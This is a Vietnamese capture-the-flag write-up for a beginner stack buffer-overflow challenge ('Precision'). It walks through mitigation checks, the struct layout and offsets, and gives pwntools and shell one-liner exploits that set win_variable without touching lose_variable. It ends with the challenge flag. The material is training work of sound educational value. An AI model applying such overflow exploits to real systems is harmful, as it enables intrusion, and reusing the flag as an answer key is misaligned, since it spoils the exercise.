@@ -1,0 +1,170 @@
+## 📌 [Viettel Training Program] - Precision (easy)
+
+- **Category:** Binary Exploitation (Pwn)
+- **Difficulty:** Easy
+- **Points:** —
+- **Description:** Overflow buffer trên stack để ghi đè `win_variable` thành giá trị khác 0, nhưng có thêm biến `lose_variable` — nếu biến này bị ghi đè thành khác 0, chương trình sẽ thoát ngay trước khi kiểm tra `win_variable`. Cần ghi đè chính xác (precision) để chỉ chạm tới `win_variable` mà không động vào `lose_variable`. Binary: `binary-exploitation-lose-variable-w`.
+
+## 1. Khảo sát Ban đầu (Mitigation Check)
+
+> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.
+
+```bash
+$ checksec ./binary-exploitation-lose-variable-w
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+```
+
+**Nhận xét nhanh:**
+
+- **Stack Canary bật** → Không được ghi đè quá xa (tới canary ở offset ~40), nhưng bài này chỉ cần ghi 24 byte — an toàn.
+- **NX enabled** → Không cần shellcode; bài chỉ ghi đè biến cục bộ.
+- **PIE disabled** → Địa chỉ code cố định (không cần cho exploit này).
+- Thách thức chính: có **hai biến** (`win_variable` và `lose_variable`) cạnh nhau; cần ghi đè `win_variable` mà không làm hỏng `lose_variable`.
+
+## 2. Phân tích Tĩnh & Động (Reversing & Analysis)
+
+### Phân tích mã nguồn
+
+Hàm `challenge()` khai báo struct cục bộ:
+
+```c
+struct {
+    char input[18];      // rbp-0x30
+    int win_variable;    // rbp-0x1c (offset 20)
+    int lose_variable;   // rbp-0x18 (offset 24)
+} data = {0};
+
+unsigned long size = 4096;
+read(0, &data.input, size);
+
+if (data.lose_variable) {
+    puts("Lose variable is set! Quitting!");
+    exit(1);
+}
+if (data.win_variable) {
+    win();
+}
+```
+
+**Lỗi:** `read()` cho phép ghi tối đa **4096 byte** vào buffer chỉ **18 byte** → tràn stack, ghi đè `win_variable` và `lose_variable`.
+
+**Điểm khác biệt:** Có **hai biến** cạnh nhau theo thứ tự `win_variable` → `lose_variable`. Nếu ghi quá tay, `lose_variable` bị set → chương trình thoát (không gọi `win()`).
+
+### Tính offset từ disassembly / output debug
+
+Chương trình **in sẵn offset** khi chạy (bản easy có debug):
+
+```c
+printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n",
+       &data.win_variable, offset_win);
+printf("The \"lose\" variable is stored at %p, %d bytes after the start of your input buffer.\n",
+       &data.lose_variable, offset_lose);
+```
+
+| Thành phần | Vị trí stack | Offset từ `input` |
+|------------|--------------|-------------------|
+| `input[18]` | `rbp-0x30` | 0 – 17 |
+| padding (2 byte) | `rbp-0x1e` | 18 – 19 |
+| `win_variable` | `rbp-0x1c` | **20 – 23** |
+| `lose_variable` | `rbp-0x18` | **24 – 27** |
+| Stack canary | `rbp-0x8` | 40 – 47 (không động tới) |
+
+Khoảng cách: `0x30 - 0x1c = 0x14` → **20 byte** padding trước `win_variable`, và `lose_variable` nằm ngay sau `win_variable` (cách 4 byte).
+
+### Phân tích động
+
+Chạy binary, gửi payload đúng **24 byte**:
+
+```bash
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x01\x00\x00\x00")' | ./binary-exploitation-lose-variable-w
+```
+
+Output xác nhận:
+```
+- the value of the win variable is 0x1.
+- the value of the lose variable is 0x0.
+You win! Here is your flag:
+```
+
+## 3. Ý tưởng Tấn công (Exploit Strategy)
+
+Bài này vẫn là **variable overwrite** nhưng yêu cầu **độ chính xác** cao hơn:
+
+1. Gửi **20 byte** padding (lấp `input[18]` + 2 byte padding).
+2. Ghi **4 byte** little-endian khác 0 vào `win_variable` (ví dụ `p32(1)`).
+3. **Dừng lại ngay** — không ghi thêm byte nào để tránh chạm `lose_variable`.
+4. `if (data.win_variable)` → `win()` → đọc và in flag.
+
+> Payload tối đa **24 byte**. Nếu ghi tới byte 28+, `lose_variable` sẽ bị set → chương trình thoát trước khi gọi `win()`.
+
+> Không copy offset từ bài "Your First Overflow" — struct layout hoàn toàn khác.
+
+## 4. Mã Khai thác (Exploit Script)
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "info"
+
+# exe = ELF("./binary-exploitation-lose-variable-w")
+# r = process("./binary-exploitation-lose-variable-w")
+r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote
+
+OFFSET_WIN = 20   # input → win_variable
+OFFSET_LOSE = 24  # input → lose_variable (phải tránh!)
+
+payload = flat({
+    OFFSET_WIN: p32(1),   # win_variable = 1
+    # KHÔNG ghi gì thêm — lose_variable giữ nguyên 0
+})
+
+r.sendafter(b"Send your payload", payload)
+
+r.interactive()
+```
+
+Payload tối thiểu (local):
+
+```python
+from pwn import *
+r = process("./binary-exploitation-lose-variable-w")
+r.sendafter(b"Send your payload", b"A" * 20 + p32(1))
+r.interactive()
+```
+
+Hoặc không dùng pwntools (local):
+
+```bash
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x01\x00\x00\x00")' | ./binary-exploitation-lose-variable-w
+```
+
+## 5. Kết quả & Flag
+
+Chạy exploit trên môi trường challenge (có `/flag`, binary SUID nếu yêu cầu):
+
+```text
+Send your payload (up to 4096 bytes)!
+You sent 24 bytes!
+...
+- the value of the win variable is 0x1.
+- the value of the lose variable is 0x0.
+
+You win! Here is your flag:
+pwn.college{UQD4WMUG5D2IeMvAy5YCcJOq5bu.0FNwcDMxwSMzgjNwEzW}
+```
+
+*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win()` đã được gọi.)*
+
+**Lessons Learned (Bài học rút ra):**
+
+- **Precision overwrite:** Không chỉ cần ghi đúng offset, mà còn cần **dừng đúng chỗ** để tránh ghi đè biến khác (ở đây là `lose_variable`).
+- **Struct layout matters:** `win_variable` và `lose_variable` nằm sát nhau trong struct; thứ tự khai báo quyết định thứ tự trong bộ nhớ.
+- **Canary không phải vấn đề** khi chỉ ghi 24 byte — canary ở xa hơn nhiều (offset 40).
+- Debug output (bản easy) cho offset chính xác — tận dụng thông tin này thay vì phải reverse.
+- Luôn kiểm tra **tất cả biến** trong vùng overflow để tránh side-effect không mong muốn.
